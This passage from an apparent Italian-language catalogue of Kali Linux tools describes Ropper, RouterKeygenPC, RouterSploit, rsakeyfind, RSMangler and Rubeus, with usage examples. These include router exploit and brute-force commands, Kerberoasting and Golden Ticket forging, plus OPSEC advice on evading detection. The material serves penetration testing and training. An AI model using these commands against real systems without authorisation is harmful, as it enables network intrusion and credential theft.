complessi, e comune esportare i gadget trovati e combinarli manualmente in uno script Python, gestendo offset e allineamento dello stack. Quando ASLR e attivo, i gadget devono provenire da moduli a indirizzo noto o e necessario un information leak preliminare.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nell'<strong>exploit development</strong> per vulnerabilita di tipo buffer overflow o format string, Ropper e lo strumento primario per costruire payload ROP che bypassano DEP/NX. L'analisi dei gadget disponibili nel binario target e nelle librerie caricate determina la fattibilita dell'exploit e guida la strategia di sfruttamento.</p><p>Durante le <strong>competizioni CTF</strong>, particolarmente nelle categorie pwn, Ropper accelera enormemente la risoluzione di challenge che richiedono ROP chain. La generazione automatica di catene per execve risolve molti challenge in pochi secondi, mentre la ricerca semantica aiuta nei casi piu complessi.</p><p>Nella <strong>ricerca sulla sicurezza dei compilatori</strong>, l'analisi sistematica dei gadget disponibili in binari compilati con diverse opzioni permette di valutare l'efficacia di tecniche di mitigazione come CFI (Control Flow Integrity) e CET (Control-flow Enforcement Technology).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Ropper opera interamente offline sul sistema dell'analista, analizzando copie locali dei binari target. Non genera traffico di rete ne interagisce con sistemi remoti. L'utilizzo dello strumento non e rilevabile dal target, tuttavia il payload ROP risultante potrebbe essere rilevato da soluzioni EDR durante l'esecuzione dell'exploit se contiene pattern noti.</p><p><strong>Impatto operativo:</strong> La costruzione di catene ROP affidabili richiede una comprensione approfondita dell'architettura target, delle calling convention e dello stato dello stack al momento del dirottamento del flusso di esecuzione. ASLR rende necessario un information leak preliminare per calcolare gli indirizzi reali dei gadget. Stack canary e altre protezioni possono richiedere tecniche addizionali prima di poter sfruttare la catena ROP.</p><p><strong>Mitigazioni:</strong> Combinare Ropper con strumenti complementari come one_gadget per identificare gadget singoli sufficienti a ottenere una shell. Verificare sempre la catena generata in ambiente controllato prima dell'utilizzo in scenari reali. Considerare l'uso di tecniche di offuscamento del payload ROP per evadere signature-based detection.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "routerkeygenpc",
    "name": "routerkeygenpc",
    "version": "1.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/routerkeygenpc/",
    "desc": "Genera password WiFi di default per router comuni basate su SSID e BSSID.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RouterKeygenPC</strong> e uno strumento che calcola le password WiFi di default per un ampio numero di modelli di router, partendo da informazioni pubblicamente visibili come SSID e BSSID (indirizzo MAC dell'access point). Sfrutta il fatto che molti produttori di router utilizzano algoritmi deterministici per generare le password di fabbrica, derivandole da parametri come il numero seriale, il MAC address o l'SSID stesso. Lo strumento implementa gli algoritmi noti per produttori come Thomson, SpeedTouch, Huawei, Pirelli, Eircom, O2, Alice (Telecom Italia), Verizon FiOS e molti altri. RouterKeygenPC opera completamente offline una volta installato, non necessitando di connessione internet per il calcolo delle password. E importante sottolineare che lo strumento funziona esclusivamente su reti dove la password di default non e stata modificata dall'utente, rappresentando quindi un test efficace per verificare la conformita alle best practice di sicurezza WiFi.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Database algoritmi multi-vendor:</strong> RouterKeygenPC include implementazioni degli algoritmi di generazione password per decine di produttori di router. Ogni algoritmo e specifico per un modello o una famiglia di dispositivi e utilizza diverse combinazioni di parametri (SSID, BSSID, numero seriale derivato) per calcolare la password WPA/WPA2 di default. Il database viene aggiornato dalla comunita con nuovi algoritmi man mano che vengono scoperti attraverso reverse engineering del firmware dei router.</p><p><strong>Calcolo basato su SSID e BSSID:</strong> L'utente inserisce il nome della rete WiFi (SSID) e opzionalmente il BSSID ottenuto da una scansione wireless. Lo strumento identifica automaticamente il produttore e il modello probabile del router, seleziona l'algoritmo appropriato e genera una o piu password candidate. In alcuni casi vengono proposte multiple password poiche l'algoritmo puo avere varianti regionali o per sotto-modelli.</p><p><strong>Modalita batch e integrazione:</strong> RouterKeygenPC puo processare liste di reti rilevate durante una scansione wireless, generando password candidate per tutte le reti identificate in un'unica operazione. Questo e particolarmente utile durante assessment di sicurezza su larga scala dove e necessario verificare centinaia di access point in un'organizzazione per identificare quelli ancora configurati con credenziali di fabbrica.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>RouterKeygenPC dispone sia di un'interfaccia grafica sia di modalita command-line. Per l'utilizzo e necessario prima raccogliere le informazioni sulle reti WiFi target tramite strumenti di scansione wireless come airodump-ng o il gestore WiFi del sistema operativo.</p><pre><code># Avvio interfaccia grafica\nrouterkeygenpc\n\n# Workflow tipico:\n# 1. Scansione reti WiFi per raccogliere SSID e BSSID\nairodump-ng wlan0mon\n\n# 2. Inserimento SSID e BSSID nell'interfaccia\n# SSID: Thomson2A5F3B\n# BSSID: 00:1F:9F:2A:5F:3C\n\n# 3. Click su 'Calculate' per generare password\n# 4. Test manuale delle password generate\n# 5. Verifica connessione con password trovata</code></pre><p>Le password generate sono candidate e non sempre corrette al 100%, poiche alcuni produttori hanno modificato gli algoritmi nel tempo o utilizzano varianti regionali. E buona pratica testare tutte le password proposte dallo strumento prima di concludere che la rete non sia vulnerabile.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante un <strong>WiFi penetration testing</strong>, RouterKeygenPC rappresenta il primo strumento da utilizzare prima di passare ad attacchi piu complessi come il cracking dell'handshake WPA. Se la password di default non e stata modificata, l'accesso alla rete si ottiene in pochi secondi senza necessita di cattura traffico o attacchi computazionalmente costosi.</p><p>In un <strong>security audit aziendale</strong>, lo strumento permette di verificare rapidamente che tutti gli access point dell'organizzazione abbiano password personalizzate e non quelle di fabbrica. La presenza di anche un solo AP con credenziali default rappresenta una vulnerabilita critica che consente l'accesso non autorizzato alla rete.</p><p>Per il <strong>recupero password della propria rete</strong>, RouterKeygenPC puo aiutare a recuperare l'accesso a un router domestico di cui si e persa la password, a condizione che non sia stata modificata rispetto a quella di fabbrica stampata sull'etichetta del dispositivo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'utilizzo di RouterKeygenPC in se non genera alcun traffico di rete e non e rilevabile, poiche il calcolo avviene interamente offline. Tuttavia, il successivo tentativo di connessione con la password generata produce log sull'access point e potrebbe essere rilevato da sistemi WIDS/WIPS (Wireless Intrusion Detection/Prevention System) se il MAC address del client non e tra quelli autorizzati.</p><p><strong>Impatto operativo:</strong> L'efficacia dello strumento e strettamente limitata ai casi in cui l'utente non ha modificato la password di default. Con la crescente consapevolezza sulla sicurezza e l'adozione di password casuali forti da parte dei nuovi modelli di router (WPA3), la percentuale di reti vulnerabili a questo tipo di attacco e in diminuzione. Inoltre, algoritmi di produttori recenti o aggiornamenti firmware potrebbero non essere ancora inclusi nel database dello strumento.</p><p><strong>Mitigazioni:</strong> Verificare sempre la legalita dell'utilizzo nella giurisdizione operativa prima di procedere. Documentare accuratamente le reti testate e i risultati durante l'audit. Utilizzare un MAC address randomizzato durante i test per ridurre la tracciabilita del dispositivo di testing sulle reti analizzate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "routersploit",
    "name": "routersploit",
    "version": "3.4.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/routersploit/",
    "desc": "Framework exploitation per router, IoT e dispositivi embedded con moduli automatici.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RouterSploit</strong> e un framework di exploitation open-source scritto in Python, progettato specificamente per dispositivi embedded come router, access point, switch, firewall, NAS, telecamere IP e altri dispositivi IoT. L'architettura modulare si ispira a Metasploit, con moduli organizzati in categorie (exploits, scanners, creds, payloads) e un'interfaccia a riga di comando interattiva con sintassi familiare. Il framework include centinaia di moduli per vulnerabilita note nei firmware di produttori come D-Link, Netgear, TP-Link, Cisco, Huawei, ZTE, MikroTik e molti altri. RouterSploit colma una lacuna importante nell'ecosistema degli strumenti di sicurezza, poiche Metasploit si concentra prevalentemente su sistemi operativi tradizionali mentre i dispositivi embedded presentano superfici di attacco uniche legate a firmware custom, protocolli proprietari e credenziali hardcoded.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Moduli exploit per dispositivi embedded:</strong> RouterSploit include centinaia di exploit per vulnerabilita note nei firmware di router e dispositivi IoT, tra cui bypass di autenticazione, command injection, path traversal, buffer overflow e backdoor hardcoded. Ogni modulo e documentato con riferimenti CVE, versioni firmware vulnerabili e impatto. I moduli gestiscono automaticamente la comunicazione HTTP/HTTPS, Telnet, SSH e protocolli proprietari specifici dei dispositivi target.</p><p><strong>Scanner autopwn e vulnerability assessment:</strong> Il modulo <code>scanners/autopwn</code> testa automaticamente tutti gli exploit applicabili contro un dispositivo target, identificando le vulnerabilita sfruttabili senza intervento manuale. Moduli scanner specifici per vendor permettono assessment mirati, mentre il modulo di rilevamento automatico del modello del dispositivo seleziona i test piu rilevanti. I risultati vengono classificati per severita con indicazione della probabilita di successo.</p><p><strong>Moduli credential testing:</strong> La categoria <code>creds</code> include moduli per il testing di credenziali predefinite su protocolli comuni come HTTP, FTP, SSH, Telnet e SNMP. Questi moduli utilizzano database di credenziali di default specifiche per produttore e modello, andando oltre le liste generiche. Il testing e ottimizzato per evitare lockout degli account e rispettare i rate limit dei dispositivi embedded che spesso hanno risorse limitate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>RouterSploit si avvia con il comando <code>rsf</code> e presenta un prompt interattivo simile a Metasploit. La navigazione tra i moduli avviene con i comandi <code>use</code>, <code>show</code> e <code>set</code>, rendendo l'apprendimento immediato per chi ha familiarita con il framework Metasploit.</p><pre><code># Avvio del framework\nrsf\n\n# Scansione automatica di tutte le vulnerabilita\nuse scanners/autopwn\nset target 192.168.1.1\nrun\n\n# Exploit specifico per D-Link\nuse exploits/routers/dlink/dir_300_615_auth_bypass\nset target 192.168.1.1\ncheck              # verifica se il target e vulnerabile\nrun                # esegui l'exploit\n\n# Test credenziali default via HTTP\nuse creds/routers/http_default\nset target 192.168.1.1\nrun\n\n# Test credenziali SSH\nuse creds/generic/ssh_default\nset target 192.168.1.1\nrun\n\n# Scansione specifica per vendor\nuse scanners/routers/dlink_scan\nset target 192.168.1.1\nrun</code></pre><p>Prima di eseguire exploit potenzialmente distruttivi, utilizzare sempre il comando <code>check</code> per verificare la vulnerabilita senza modificare lo stato del dispositivo. Alcuni exploit possono causare il riavvio del dispositivo o la perdita della configurazione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>penetration testing di infrastrutture di rete</strong>, RouterSploit permette di valutare rapidamente la sicurezza di tutti i dispositivi di rete di un'organizzazione, identificando firmware obsoleti, credenziali di default non modificate e vulnerabilita note. Questo tipo di assessment e critico poiche i router compromessi offrono posizioni privilegiate per pivoting, intercettazione del traffico e persistenza a lungo termine.</p><p>Per la <strong>sicurezza IoT in ambienti industriali</strong>, il framework consente di testare dispositivi embedded che spesso non possono essere aggiornati facilmente e operano con firmware datati. L'identificazione di vulnerabilita in questi contesti permette di implementare misure compensative come segmentazione di rete e monitoring dedicato.</p><p>Nella <strong>ricerca di vulnerabilita su firmware</strong>, RouterSploit serve come piattaforma per lo sviluppo e il testing rapido di nuovi moduli exploit. L'architettura modulare e la documentazione completa facilitano la creazione di nuovi moduli, contribuendo all'ecosistema open-source della sicurezza IoT.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'attivita di scanning e exploitation genera traffico di rete diretto verso il dispositivo target che puo essere rilevato da IDS/IPS e sistemi di monitoring. Le richieste HTTP malformate e i tentativi di autenticazione multipli sono pattern facilmente identificabili. Molti exploit utilizzano URL e payload specifici che hanno signature note nei database dei sistemi di rilevamento.</p><p><strong>Impatto operativo:</strong> Alcuni moduli exploit possono causare il crash o il riavvio del dispositivo target, provocando interruzione del servizio di rete. Dispositivi embedded con risorse limitate sono particolarmente sensibili a scanning aggressivo. Gli exploit che modificano la configurazione del dispositivo (come l'aggiunta di account backdoor) possono essere persistenti e richiedere un factory reset per la rimozione completa.</p><p><strong>Mitigazioni:</strong> Eseguire sempre il comando <code>check</code> prima di <code>run</code> per verificare la vulnerabilita senza impatto. Pianificare finestre di manutenzione per i test su dispositivi in produzione. Documentare lo stato iniziale della configurazione del dispositivo per consentire il ripristino. Utilizzare rate limiting nei moduli di credential testing per evitare lockout. Coordinarsi con il team di rete per evitare allarmi durante l'assessment autorizzato.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "IoT"
    ],
    "notes": null
  },
  {
    "id": "rsakeyfind",
    "name": "rsakeyfind",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rsakeyfind/",
    "desc": "Cerca chiavi private RSA in memory dump e immagini disco per forensics.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RSAKeyFind</strong> e uno strumento di digital forensics specializzato nell'identificazione e nell'estrazione di chiavi private RSA da memory dump, immagini disco e file raw. Il tool funziona cercando pattern matematici caratteristici delle strutture dati delle chiavi RSA, in particolare la sequenza dei parametri ASN.1/DER che compongono una chiave privata PKCS#1 (modulo n, esponente pubblico e, esponente privato d, fattori primi p e q, e i parametri CRT). Questo approccio permette di individuare chiavi anche quando non sono memorizzate in file con estensioni riconoscibili o quando sono state eliminate ma i dati persistono nella memoria volatile o nello spazio non allocato del disco. RSAKeyFind e particolarmente rilevante in scenari forensi dove e necessario recuperare materiale crittografico per decifrare comunicazioni o file protetti, ed e stato utilizzato con successo nella ricerca accademica sugli attacchi cold boot che dimostrano la persistenza dei dati in RAM dopo lo spegnimento del sistema.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Ricerca pattern chiavi RSA in dati raw:</strong> RSAKeyFind scansiona sequenzialmente i dati di input alla ricerca delle sequenze di byte che corrispondono alla struttura ASN.1 delle chiavi RSA private. L'algoritmo identifica i marker di inizio della struttura PKCS#1, verifica la coerenza matematica dei parametri trovati (ad esempio che p*q=n) e riporta la posizione e i parametri della chiave. Questo approccio funziona indipendentemente dal filesystem o dal formato del contenitore.</p><p><strong>Analisi memory dump e RAM acquisita:</strong> Lo strumento e ottimizzato per lavorare su dump della memoria RAM acquisiti tramite tool forensi come LiME, WinPmem o DumpIt. In memoria, le chiavi RSA sono spesso presenti in forma non cifrata poiche i software crittografici devono mantenerle accessibili durante le operazioni. RSAKeyFind puo identificare chiavi utilizzate da server SSH, VPN, web server TLS e applicazioni di cifratura dei file.</p><p><strong>Supporto per immagini disco e file di paging:</strong> Oltre alla RAM, RSAKeyFind opera efficacemente su immagini disco complete, partizioni swap, file di paging (pagefile.sys) e file di ibernazione (hiberfil.sys). Questi file contengono spesso copie della memoria volatile e possono preservare chiavi RSA anche dopo il riavvio del sistema. L'analisi del file di ibernazione e particolarmente interessante poiche contiene una copia compressa dell'intera memoria al momento dell'ibernazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>RSAKeyFind ha un'interfaccia minimale: accetta il file da analizzare come unico argomento e produce in output le chiavi RSA trovate con la loro posizione nel file. Per dump di grandi dimensioni l'analisi puo richiedere tempo proporzionale alla dimensione dei dati.</p><pre><code># Ricerca chiavi RSA in un memory dump\nrsakeyfind memory.raw\n\n# Analisi di un'immagine disco\nrsakeyfind disk_image.dd\n\n# Ricerca nel file di paging Windows\nrsakeyfind pagefile.sys\n\n# Ricerca nel file di ibernazione\nrsakeyfind hiberfil.sys\n\n# Analisi della partizione swap Linux\nrsakeyfind swap_partition.dd\n\n# Redirect output su file per analisi successiva\nrsakeyfind memory.raw > found_keys.txt</code></pre><p>Le chiavi trovate vengono riportate con offset nel file sorgente e parametri matematici (modulo, esponenti). Per utilizzare le chiavi estratte e necessario ricostruirle in un formato standard (PEM/DER) utilizzando strumenti come OpenSSL o script Python dedicati. In alcuni casi, specialmente con dump parziali o corrotti, solo alcuni parametri potrebbero essere recuperabili.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nell'ambito della <strong>digital forensics post-incidente</strong>, RSAKeyFind permette di recuperare chiavi crittografiche da sistemi compromessi per decifrare comunicazioni o file protetti dall'attaccante. Se un attaccante ha utilizzato cifratura RSA per proteggere i dati esfiltrati o le comunicazioni con il C2, il recupero della chiave dal memory dump del sistema compromesso puo consentire la decifratura retroattiva del traffico catturato.</p><p>Nella ricerca sui <strong>cold boot attack</strong>, lo strumento dimostra la fattibilita del recupero di chiavi crittografiche dalla RAM residua dopo lo spegnimento del computer. Questo ha implicazioni importanti per la sicurezza dei sistemi con full disk encryption, dove le chiavi di decifratura devono necessariamente risiedere in memoria durante il funzionamento del sistema.</p><p>Per l'<strong>analisi forense di server compromessi</strong>, RSAKeyFind puo estrarre chiavi private TLS/SSL o SSH dal memory dump del server, permettendo la decifratura del traffico di rete catturato durante l'incidente e l'identificazione delle attivita dell'attaccante nelle sessioni cifrate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> RSAKeyFind opera esclusivamente su file gia acquisiti e non interagisce con sistemi live o reti. L'esecuzione dello strumento e completamente locale e non produce alcun effetto collaterale rilevabile. L'acquisizione del memory dump dal sistema target e la fase che richiede attenzione dal punto di vista OPSEC, poiche necessita di accesso privilegiato e puo essere rilevata da soluzioni di endpoint protection.</p><p><strong>Impatto operativo:</strong> Il principale limite dello strumento e la sua specificita per le chiavi RSA: non rileva chiavi di altri algoritmi come ECDSA, Ed25519 o AES. I falsi positivi sono possibili quando sequenze di byte casuali corrispondono parzialmente al pattern di una chiave RSA, richiedendo validazione manuale dei risultati. Per dump di grandi dimensioni (oltre 4-8 GB di RAM), l'analisi puo richiedere tempo considerevole e spazio disco per l'output.</p><p><strong>Mitigazioni:</strong> Validare sempre matematicamente le chiavi trovate verificando la relazione tra i parametri (p*q=n, d*e mod phi(n)=1). Combinare RSAKeyFind con strumenti piu generici come Volatility per contestualizzare le chiavi trovate con i processi che le utilizzavano. Per un'analisi crittografica completa, utilizzare strumenti complementari come aeskeyfind per chiavi AES e bulk_extractor per l'estrazione sistematica di artefatti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Memory_Analysis"
    ],
    "notes": null
  },
  {
    "id": "rsmangler",
    "name": "rsmangler",
    "version": "1.5",
    "icon": "../app/icons/rsmangler-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rsmangler/",
    "desc": "Genera wordlist personalizzate applicando trasformazioni comuni a parole base.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RSMangler</strong> e uno strumento per la generazione di wordlist personalizzate, progettato per creare dizionari ottimizzati partendo da un insieme ridotto di parole base rilevanti per il target. A differenza dei dizionari generici che contengono milioni di password comuni, RSMangler produce wordlist mirate applicando sistematicamente trasformazioni che riflettono i pattern reali con cui gli utenti creano password. Lo strumento applica combinazioni di leetspeak (sostituzione lettere con numeri simili), variazioni di capitalizzazione, aggiunta di suffissi numerici (anni, sequenze), inserimento di caratteri speciali e concatenazione di parole. Partendo anche da poche parole chiave ottenute tramite OSINT sul target (nome azienda, nomi dipendenti, date significative, prodotti), RSMangler genera migliaia di varianti che coprono le trasformazioni piu probabili. Questo approccio mirato risulta significativamente piu efficace del brute force puro e piu rapido dell'utilizzo di dizionari generici molto grandi.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Trasformazioni leetspeak e capitalizzazione:</strong> RSMangler applica conversioni leetspeak standard (a->4, e->3, i->1, o->0, s->5, t->7) in modo progressivo, generando varianti con una, alcune o tutte le sostituzioni applicate. Le variazioni di capitalizzazione includono lowercase, UPPERCASE, Capitalized, camelCase e alternanze. Queste trasformazioni replicano i pattern piu comuni utilizzati dagli utenti che cercano di rendere le password piu complesse mantenendole memorizzabili.</p><p><strong>Suffissi numerici e caratteri speciali:</strong> Lo strumento aggiunge automaticamente suffissi numerici comuni come anni (2020-2026), sequenze (123, 1234), numeri singoli e doppi. I caratteri speciali vengono inseriti in posizioni tipiche: alla fine della password (!,@,#,$), tra parole concatenate e come sostituzione di spazi. Queste aggiunte simulano il comportamento degli utenti che devono soddisfare requisiti di complessita delle password policy aziendali.</p><p><strong>Combinazione e concatenazione di parole:</strong> RSMangler puo concatenare le parole base in coppie e triple, con e senza separatori, replicando il pattern delle passphrase. La combinazione di parole con le altre trasformazioni genera un dizionario che copre un'ampia gamma di varianti possibili. E possibile controllare la lunghezza minima e massima delle password generate per adattarsi alle policy del target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>RSMangler accetta input da file di testo o da stdin, con una parola base per riga. L'output viene generato su stdout o su file, ed e consigliabile filtrare per lunghezza minima e massima per ridurre la dimensione della wordlist risultante alle password effettivamente valide per il target.</p><pre><code># Generazione wordlist da file di parole base\nrsmangler -f parole_base.txt -o wordlist_target.txt\n\n# Con filtro lunghezza minima e massima\nrsmangler -f parole_base.txt --min 8 --max 20 -o wordlist.txt\n\n# Input diretto da stdin\necho -e \"company\\nadmin\\n2024\" | rsmangler > wordlist.txt\n\n# Solo trasformazioni leetspeak\nrsmangler -f words.txt --leet -o leet_wordlist.txt\n\n# Con aggiunta anni\nrsmangler -f words.txt --years -o years_wordlist.txt\n\n# Combinazione con hydra per brute force\nrsmangler -f target_words.txt --min 8 | hydra -l admin -P - target ssh</code></pre><p>Per massimizzare l'efficacia, le parole base dovrebbero essere raccolte attraverso OSINT sul target: nomi dell'azienda, prodotti, sedi, nomi di dipendenti, date di fondazione e termini specifici del settore. Un set iniziale di 5-15 parole base ben scelte produce risultati migliori di centinaia di parole generiche.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In un <strong>penetration testing mirato</strong>, RSMangler trasforma le informazioni raccolte durante la fase di ricognizione in una wordlist personalizzata per il target. Nomi di dipendenti, indirizzo dell'azienda, anno di fondazione e prodotti diventano la base per un dizionario che copre le password piu probabili, con tassi di successo significativamente superiori rispetto a dizionari generici come rockyou.txt.</p><p>Durante un <strong>audit delle password policy aziendali</strong>, lo strumento permette di generare wordlist che rispettano i requisiti di complessita dell'organizzazione (lunghezza minima, caratteri speciali, numeri) per verificare se le password scelte dai dipendenti, pur soddisfando i requisiti formali, sono comunque prevedibili e derivabili da informazioni pubbliche.</p><p>Per attivita di <strong>red teaming con componente social engineering</strong>, le password generate combinando informazioni personali raccolte dai social media dei dipendenti (nomi familiari, date di nascita, hobby, squadre sportive) si rivelano spesso efficaci, dimostrando la vulnerabilita delle password basate su informazioni personali anche quando tecnicamente complesse.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> RSMangler stesso opera offline e non genera traffico di rete. Tuttavia, l'utilizzo della wordlist generata in attacchi online (brute force su servizi di autenticazione) produce numerosi tentativi di login falliti che vengono registrati nei log del sistema target e possono attivare meccanismi di lockout e allarmi di sicurezza. Gli attacchi offline contro hash estratti non presentano questo rischio.</p><p><strong>Impatto operativo:</strong> La dimensione della wordlist cresce esponenzialmente con il numero di parole base e le trasformazioni abilitate. Un set iniziale di 10 parole con tutte le trasformazioni attive puo generare milioni di varianti, richiedendo spazio disco significativo e tempi di attacco proporzionali. E fondamentale bilanciare la copertura delle trasformazioni con la praticabilita dell'attacco, filtrando per lunghezza e complessita coerenti con la password policy del target.</p><p><strong>Mitigazioni:</strong> Utilizzare sempre i filtri di lunghezza minima e massima per ridurre le varianti inutili. Preferire attacchi offline contro hash quando possibile per evitare lockout e rilevamento. Combinare RSMangler con regole di hashcat per trasformazioni piu sofisticate in fase di cracking. Documentare le parole base utilizzate e le fonti OSINT per il report finale dell'assessment.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists",
      "Generators"
    ],
    "notes": null
  },
  {
    "id": "rubeus",
    "name": "rubeus",
    "version": "1.6.4",
    "icon": "../app/icons/rubeus-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rubeus/",
    "desc": "Toolset Kerberos per attacchi AD: AS-REP roasting, S4U, delegation, golden ticket.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Rubeus</strong> e un toolset avanzato scritto in C# per l'interazione con il protocollo Kerberos in ambienti Active Directory. Rappresenta uno degli strumenti piu completi per l'abuso del protocollo Kerberos, supportando un'ampia gamma di attacchi tra cui AS-REP Roasting, Kerberoasting, abuso S4U (Service for User), manipolazione delle delegation (constrained e unconstrained), forging di ticket (Golden Ticket, Silver Ticket, Diamond Ticket), pass-the-ticket, overpass-the-hash e harvesting di ticket dalla memoria. Rubeus opera sia come eseguibile standalone sia come assembly .NET caricabile in memoria tramite execute-assembly di Cobalt Strike o strumenti similari, evitando il contatto con il disco. Lo strumento e ampiamente utilizzato nella comunita di red teaming e penetration testing Active Directory, e la sua conoscenza e fondamentale per comprendere le superfici di attacco del protocollo Kerberos nelle infrastrutture enterprise moderne.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>AS-REP Roasting e Kerberoasting:</strong> Rubeus automatizza l'estrazione di hash crackabili offline da Active Directory. L'AS-REP Roasting identifica account configurati senza pre-autenticazione Kerberos e richiede AS-REP contenenti hash crackabili. Il Kerberoasting richiede ticket di servizio (TGS) per account con Service Principal Name (SPN) registrato, ottenendo hash RC4 o AES crackabili offline. Entrambe le tecniche non richiedono privilegi elevati e possono essere eseguite da qualsiasi utente di dominio autenticato.</p><p><strong>Abuso delle delegation S4U e ticket manipulation:</strong> I moduli S4U permettono di sfruttare la constrained delegation per impersonare utenti arbitrari verso servizi specifici, e la resource-based constrained delegation (RBCD) per ottenere accesso a sistemi configurati in modo vulnerabile. Rubeus gestisce l'intera catena S4U2Self e S4U2Proxy, inclusa la manipolazione del campo sname nel ticket per abusare di delegation misconfigured. Questa funzionalita e cruciale per la privilege escalation laterale in ambienti AD complessi.</p><p><strong>Forging di ticket e persistenza:</strong> Con le chiavi crittografiche appropriate (hash KRBTGT per Golden Ticket, hash del service account per Silver Ticket), Rubeus puo creare ticket Kerberos arbitrari che garantiscono accesso come qualsiasi utente a qualsiasi servizio del dominio. Il Diamond Ticket rappresenta un'evoluzione che modifica un ticket legittimo anziche crearne uno ex novo, risultando piu difficile da rilevare. Queste tecniche forniscono meccanismi di persistenza estremamente potenti in ambienti AD compromessi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Rubeus viene tipicamente eseguito su un sistema Windows unito al dominio target, sia come eseguibile sia caricato in memoria. Ogni funzionalita e accessibile tramite un comando (action) seguito da parametri specifici. L'output include i ticket in formato base64 e gli hash in formato crackabile con hashcat o John.</p><pre><code># Kerberoasting - estrai hash per tutti gli SPN\nRubeus.exe kerberoast /outfile:kerberoast_hashes.txt\n\n# Kerberoasting con cifratura RC4 (piu facile da crackare)\nRubeus.exe kerberoast /rc4opsec /outfile:hashes.txt\n\n# AS-REP Roasting\nRubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt\n\n# Richiesta TGT con credenziali\nRubeus.exe asktgt /user:svc_account /password:Password123 /ptt\n\n# Richiesta TGT con hash NTLM (overpass-the-hash)\nRubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt\n\n# S4U - impersonazione tramite constrained delegation\nRubeus.exe s4u /user:svc_deleg /rc4:HASH /impersonateuser:domain_admin /msdsspn:cifs/target.domain.local /ptt\n\n# Golden Ticket\nRubeus.exe golden /rc4:KRBTGT_HASH /user:Administrator /domain:domain.local /sid:S-1-5-21-... /ptt\n\n# Harvesting ticket dalla sessione corrente\nRubeus.exe triage\nRubeus.exe dump</code></pre><p>Il flag <code>/ptt</code> (pass-the-ticket) inietta automaticamente il ticket ottenuto nella sessione corrente, permettendo l'accesso immediato alle risorse. Per operazioni piu discrete, e possibile salvare il ticket in formato .kirbi e importarlo successivamente con <code>/ticket:base64_encoded_ticket</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella <strong>fase di exploitation Active Directory</strong>, Rubeus e lo strumento primario per gli attacchi Kerberos. Il workflow tipico inizia con Kerberoasting e AS-REP Roasting per ottenere hash crackabili offline, procede con il cracking tramite hashcat e utilizza le credenziali ottenute per movimento laterale e privilege escalation. La capacita di operare con i soli privilegi di un utente di dominio standard rende questi attacchi il punto di partenza ideale per l'escalation.</p><p>Per la <strong>privilege escalation tramite delegation abuse</strong>, Rubeus permette di sfruttare configurazioni di delegation misconfigured per impersonare utenti privilegiati. L'identificazione di service account con constrained delegation verso servizi critici (LDAP, CIFS su domain controller) rappresenta spesso il percorso piu rapido verso Domain Admin. RBCD abuse consente privilege escalation anche senza delegation preconfigurata se si dispone di permessi di scrittura su oggetti computer.</p><p>Come meccanismo di <strong>persistenza post-compromissione</strong>, il forging di Golden Ticket garantisce accesso illimitato al dominio per la durata di vita della chiave KRBTGT (fino a che non viene ruotata due volte). Questa tecnica e utilizzata nei red team engagement per dimostrare l'impatto completo della compromissione di un domain controller e la necessita di una rotazione regolare delle chiavi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le attivita Kerberos anomale generate da Rubeus sono rilevabili da Microsoft Defender for Identity (MDI), soluzioni SIEM con regole specifiche e monitoring degli eventi Windows. Il Kerberoasting genera eventi 4769 (TGS request) con cifratura RC4 anomala, mentre l'AS-REP Roasting produce eventi 4768. I Golden 